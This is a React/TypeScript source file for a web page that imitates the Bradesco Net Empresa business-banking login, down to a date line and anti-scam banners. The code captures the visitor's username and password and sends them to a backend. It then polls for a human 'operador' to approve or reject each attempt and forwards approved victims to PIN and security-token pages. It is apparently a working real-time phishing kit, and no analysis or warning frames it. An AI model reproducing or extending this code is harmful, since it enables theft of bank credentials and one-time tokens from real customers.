import { useEffect, useRef, useState } from "react";
import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { X, ChevronRight, Loader2, XCircle } from "lucide-react";
import { enviarSolicitacao, verificarStatus } from "@/lib/cliente.functions";
import { usePresenca } from "@/hooks/use-presenca";
import bannerFalsaCentral from "@/assets/banner-golpe.jpg.asset.json";
import botaoAvancar from "@/assets/botao-avancar.png.asset.json";
import botaoCancelar from "@/assets/botao-cancelar-acesso.png.asset.json";
import caixaLogin from "@/assets/caixa-login.png.asset.json";
import colunaGolpes from "@/assets/coluna-golpes.png.asset.json";
import rodape from "@/assets/rodape.png.asset.json";
import topoSite from "@/assets/topo-site.jpg.asset.json";
import caixaLoader from "@/assets/caixa-loader.png.asset.json";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Acesso Seguro — Central de Validação" },
      {
        name: "description",
        content:
          "Acesse de forma segura. Informe seu usuário e senha para validação.",
      },
      { property: "og:title", content: "Acesso Seguro — Central de Validação" },
      {
        property: "og:description",
        content: "Informe usuário e senha para validação segura.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: ClientePage,
});

const schema = z.object({
  usuario: z.string().trim().min(3, "Informe o usuário").max(60),
  senha: z.string().min(1, "Informe a senha").max(72),
});

function dataPorExtenso() {
  const hoje = new Date();
  const dias = [
    "Domingo",
    "Segunda-feira",
    "Terça-feira",
    "Quarta-feira",
    "Quinta-feira",
    "Sexta-feira",
    "Sábado",
  ];
  const meses = [
    "Janeiro",
    "Fevereiro",
    "Março",
    "Abril",
    "Maio",
    "Junho",
    "Julho",
    "Agosto",
    "Setembro",
    "Outubro",
    "Novembro",
    "Dezembro",
  ];
  return `${dias[hoje.getDay()]}, ${hoje.getDate()} de ${meses[hoje.getMonth()]} de ${hoje.getFullYear()}`;
}

function ClientePage() {
  const enviar = useServerFn(enviarSolicitacao);
  const checar = useServerFn(verificarStatus);
  const navigate = useNavigate();
  const [usuario, setUsuario] = useState("");
  const [senha, setSenha] = useState("");
  const [erro, setErro] = useState<string | null>(null);
  const [aguardando, setAguardando] = useState(false);
  const [reprovado, setReprovado] = useState<string | null>(null);
  const [loginInvalido, setLoginInvalido] = useState(false);
  const solicitacaoIdRef = useRef<string | null>(null);
  const [idAtivo, setIdAtivo] = useState<string | null>(null);

  usePresenca(idAtivo, "senha");

  useEffect(() => {
    if (!aguardando) return;
    let cancelado = false;

    const tick = async () => {
      const id = solicitacaoIdRef.current;
      if (!id) return;
      try {
        const res = await checar({ data: { id } });
        if (cancelado) return;
        if (res.status === "aprovado") {
          setAguardando(false);
          setIdAtivo(null);
          if (res.proxima_tela === "interna" || res.proxima_tela === "interna_token_celular" || res.proxima_tela === "interna_token_chaveiro") {
            navigate({ to: "/interna", search: { id } });
            return;
          }
          const destino =
            res.proxima_tela === "pin"
              ? "/pin"
              : res.proxima_tela === "token_chaveiro"
                ? "/token-chaveiro"
                : "/token-celular";
          navigate({ to: destino, search: { id } });
        } else if (res.status === "reprovado") {
          setAguardando(false);
          setIdAtivo(null);
          solicitacaoIdRef.current = null;
          setSenha("");
          if (res.motivo === "Login inválido") {
            setLoginInvalido(true);
            setReprovado(null);
          } else {
            setLoginInvalido(false);
            setReprovado(res.motivo ?? "Solicitação reprovada pelo operador.");
          }
        } else if (res.status === "removido") {
          setAguardando(false);
          setIdAtivo(null);
          solicitacaoIdRef.current = null;
          setUsuario("");
          setSenha("");
          setLoginInvalido(false);
        }
      } catch {
        // silencia erros transitórios de polling
      }
    };
    tick();
    const timer = setInterval(tick, 1000);

    return () => {
      cancelado = true;
      clearInterval(timer);
    };
  }, [aguardando, checar, navigate]);

  async function submeter(e?: { preventDefault: () => void }) {
    e?.preventDefault();
    setErro(null);
    setReprovado(null);
    setLoginInvalido(false);
    const parsed = schema.safeParse({ usuario, senha });
    if (!parsed.success) {
      setErro(parsed.error.issues[0]?.message ?? "Dados inválidos");
      return;
    }
    setAguardando(true);
    try {
      const res = await enviar({ data: { ...parsed.data, origem: "portal-cliente" } });
      solicitacaoIdRef.current = res.id;
      setIdAtivo(res.id);
    } catch {
      setAguardando(false);
      setErro("Não foi possível enviar. Tente novamente.");
    }
  }

  function cancelar() {
    setAguardando(false);
    setIdAtivo(null);
    solicitacaoIdRef.current = null;
  }

  return (
    <div className="flex min-h-screen flex-col bg-[#e5e5e5] font-sans text-[13px] text-[#333]">
      {/* Header */}
      <header className="relative h-[156px] overflow-hidden">
        <img
          src={topoSite.url}
          alt="Bradesco Net Empresa"
          width={1920}
          height={156}
          className="absolute left-0 top-0 h-[156px] w-[1920px] max-w-none"
        />
        <span className="absolute top-[44px] left-[182px] text-[12px] text-[#666]">
          {dataPorExtenso()}
        </span>
      </header>

      {/* Main content on grey */}
      <main className="flex-1 bg-[#e5e5e5]">
        <div className="grid grid-cols-1 gap-3 px-2 pt-3 lg:grid-cols-[minmax(0,780px)_240px] lg:justify-start">
          {/* Left column */}
          <div className="bg-white p-3">
            {/* Security banner */}
            <img
              src={bannerFalsaCentral.url}
              alt="Golpe da falsa central: dicas pra se proteger"
              className="mb-3 block h-auto w-full"
            />

            {/* Login form — image with overlaid functional inputs */}
            <form
              id="loginForm"
              onSubmit={submeter}
              className="relative max-w-[717px] bg-white"
            >
              <img
                src={caixaLogin.url}
                alt="Informe o usuário e a senha"
                width={717}
                height={161}
                className="block h-auto w-full"
              />

              <input
                id="usuario"
                autoComplete="username"
                value={usuario}
                onChange={(e) => setUsuario(e.target.value.toUpperCase())}
                maxLength={60}
                required
                disabled={aguardando}
                className="absolute top-[19.9%] left-[46.7%] h-[11.8%] w-[20.6%] border-0 bg-transparent px-1 text-[12px] uppercase text-[#333] outline-none focus:outline-none focus:ring-0 disabled:bg-transparent"
              />

              <input
                id="senha"
                type="password"
                autoComplete="current-password"
                value={senha}
                onChange={(e) => setSenha(e.target.value)}
                maxLength={72}
                required
                disabled={aguardando}
                className="absolute top-[36%] left-[46.7%] h-[11.8%] w-[20.6%] border-0 bg-transparent px-1 text-[12px] text-[#333] outline-none focus:outline-none focus:ring-0 disabled:bg-transparent"
              />

              {aguardando && (
                <div
                  className="absolute inset-0 z-10 flex items-center justify-center bg-white bg-no-repeat bg-center bg-contain"
                  style={{ backgroundImage: `url(${caixaLoader.url})` }}
                >
                  <div className="flex items-center gap-2">
                    <div className="size-6 animate-spin rounded-full border border-dashed border-black" />
                    <span className="text-sm font-medium text-black">Aguarde...</span>
                  </div>
                </div>
              )}
            </form>

            {erro && (
              <p className="mt-2 max-w-[717px] rounded border border-[#ef5350]/50 bg-[#ffebee] px-3 py-2 text-[11px] text-[#c62828]">
                {erro}
              </p>
            )}

            {loginInvalido && (
              <div className="mt-2 max-w-[717px] rounded border border-dashed border-[#c62828] bg-[#fff3cd] px-3 py-2 text-[12px] text-[#721c24]">
                <p>
                  <strong>Dados inválidos.</strong> Verifique se seu usuário e senha estão corretos e tente novamente. Se o erro persistir,{" "}
                  <button type="button" className="font-bold underline hover:text-[#c62828]">
                    confira aqui
                  </button>{" "}
                  como regularizar o acesso.
                </p>
              </div>
            )}

            {reprovado && (
              <div className="mt-2 max-w-[717px] rounded border border-[#ef5350]/50 bg-[#ffebee] px-3 py-2 text-[11px] text-[#c62828]">
                <div className="flex items-center gap-1.5 font-bold">
                  <XCircle className="size-3.5" />
                  Solicitação reprovada
                </div>
                <p className="mt-1 text-[#c62828]/80">{reprovado}</p>
              </div>
            )}

            <div className="mt-3 flex items-center justify-end gap-2">
              <button
                type="button"
                onClick={cancelar}
                disabled={aguardando}
                className="relative inline-flex cursor-pointer items-center justify-center disabled:cursor-default"
              >
                <img
                  src={botaoCancelar.url}
                  alt="Cancelar acesso"
                  width={121}
                  height={23}
                  className="block h-[23px] w-[121px] cursor-pointer"
                />
              </button>
              <button
                type="button"
                onClick={submeter}
                disabled={aguardando}
                className="relative inline-flex cursor-pointer items-center justify-center disabled:cursor-default"
              >
                <img
                  src={botaoAvancar.url}
                  alt="Avançar"
                  width={82}
                  height={22}
                  className="block h-[22px] w-[82px] cursor-pointer"
                />
              </button>
            </div>

            <p className="mt-3 text-[11px] text-[#333]">
              Se seu contrato foi feito na agência,{" "}
              <button
                type="button"
                className="font-bold text-[#333] underline hover:text-[#c8102e]"
              >
                faça seu primeiro acesso por aqui.
              </button>
            </p>
          </div>


          {/* Right column */}
          <aside className="overflow-visible bg-[#e5e5e5] px-2">
            <img
              src={colunaGolpes.url}
              alt="Se proteja contra golpes e fraudes"
              className="block h-auto w-full origin-top-left scale-[1.05]"
            />
          </aside>
        </div>
      </main>

      {/* Footer */}
      <footer className="mt-6">
        <img
          src={rodape.url}
          alt="Bradesco Apoio à Empresa"
          className="block h-auto w-full"
        />
      </footer>
    </div>
  );
}
